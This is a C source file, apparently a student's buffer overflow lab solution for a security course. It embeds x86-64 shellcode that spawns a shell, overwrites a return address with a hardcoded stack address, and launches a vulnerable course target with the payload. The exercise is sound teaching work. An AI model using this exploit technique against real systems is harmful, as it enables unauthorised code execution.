#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
// note that you must have the target executable generated first (by using 'make' command)
//#define TARGET "/home/net/czou/project1/targets/target"
#define TARGET "/home/net/gr365062/6135-A1/CAP6135-project1-source/targets/target"
// 6135-A1/CAP6135-project1-source/targets/target
//
int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;

  // Creating an input buffer that can cause buffer overflow in strcpy function in the target executable
  int buffSize = 1000; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   for (i=0; i < buffSize; i++) 	buff[i] = 0x01;

  // write your code below to fill the 27 bytes shellcode into the buff variable and 
  // overwrite the return address correctly in order to achieve stack overflow
  // Your own code starts here:
  buff[0]=shellcode[0];
  buff[1]=shellcode[1];
  buff[2]=shellcode[2];
  buff[3]=shellcode[3];
  buff[4]=shellcode[4];
  buff[5]=shellcode[5];
  buff[6]=shellcode[6];
  buff[7]=shellcode[7];
  buff[8]=shellcode[8];
  buff[9]=shellcode[9];
  buff[10]=shellcode[10];
  buff[11]=shellcode[11];
  buff[12]=shellcode[12];
  buff[13]=shellcode[13];
  buff[14]=shellcode[14];
  buff[15]=shellcode[15];
  buff[16]=shellcode[16];
  buff[17]=shellcode[17];  
  buff[18]=shellcode[18];
  buff[19]=shellcode[19];
  buff[20]=shellcode[20];
  buff[21]=shellcode[21];
  buff[22]=shellcode[22];
  buff[23]=shellcode[23];
  buff[24]=shellcode[24];
  buff[25]=shellcode[25];
  buff[26]=shellcode[26];
  buff[27]=shellcode[27];

  //stack smash at value [152] with return address 0xffffffffec30
  int start=152;
  buff[start]=0x30;
  buff[start+1]=0xec;
  buff[start+2]=0xff;
  buff[start+3]=0xff;
  buff[start+4]=0xff;
  buff[start+5]=0x7f;
  buff[900]=0x00; //null terminator

  char myBuff[]="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05                                                                                                                             \xa0\xeb\xff\xff\xff\x7f\x00";
  
  // Your code ends here.
  
  // prepare command line input to execute target code
  args[0] = TARGET; 
  args[1] = myBuff; // the first input parameter to the target code
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
   return 0;
}
